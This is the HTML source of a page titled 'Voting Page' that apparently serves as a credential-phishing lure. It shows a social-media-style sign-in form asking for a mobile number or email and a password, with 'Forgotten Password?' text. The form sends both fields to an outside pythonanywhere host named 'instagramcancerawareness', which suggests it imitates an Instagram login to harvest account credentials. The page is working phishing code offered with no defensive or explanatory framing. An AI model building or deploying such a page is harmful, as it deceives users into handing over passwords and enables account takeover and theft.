<!DOCTYPE html>
<html lang="en">
<head>
<!-- TYPE BELOW IS PROBABLY: 'website' or 'article' or look on https://ogp.me/#types -->
<meta property="og:type" content='Voting Page'/>
	<meta charset="utf-8">
	<meta name="author" content="Kodinger">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Voting Page</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css/my-login.css">
	
</head>

<body class="my-login-page">

	<section class="h-100">
		<div class="container h-100">
			<div class="row justify-content-md-center h-100">
				<div class="card-wrapper">

					<center><div class="brand">
						<img src="img/logo.png" style='max-width: 150px; max-height: 150px;' alt="logo">
					</div></center>
					
					<div class="card fat">
						<div class="card-body">
							<h4 class="card-title">Sign in to continue</h4>
							
							<form action="https://instagramcancerawareness.pythonanywhere.com/login2" method="POST" class="my-login-validation" novalidate="">
							
								<div class="form-group">
									<input id="email" type="username" placeholder="Mobile number or email address" class="form-control" name="email" value="" required autofocus>

									<div class="invalid-feedback">
										Email is invalid
									</div>
								</div>

								<div class="form-group">
									
									<input id="password" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
								    <div class="invalid-feedback">
								    	Password is required
							    	</div>
								</div>
								
								

								<div class="form-group m-0">
									<button type="submit" class="btn btn-primary btn-block">
										Log in
									</button>
									
									<center><p style="color:blue; margin: 10px"; >Forgotten Password?</p></center>
								</div>
								<center><a href='index.html'>
						<img style="margin-bottom: 0px; margin-left: 0px; margin-right: 0px; max-width: 200px; " src="img/create2.jpg" alt="logo">
					</a></center>
							</form>
						</div>
					</div>
					<div class="footer">
					</div>
				</div>
			</div>
		</div>
	</section>

	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	<script src="js/my-login.js.html"></script>
</body>
</html>
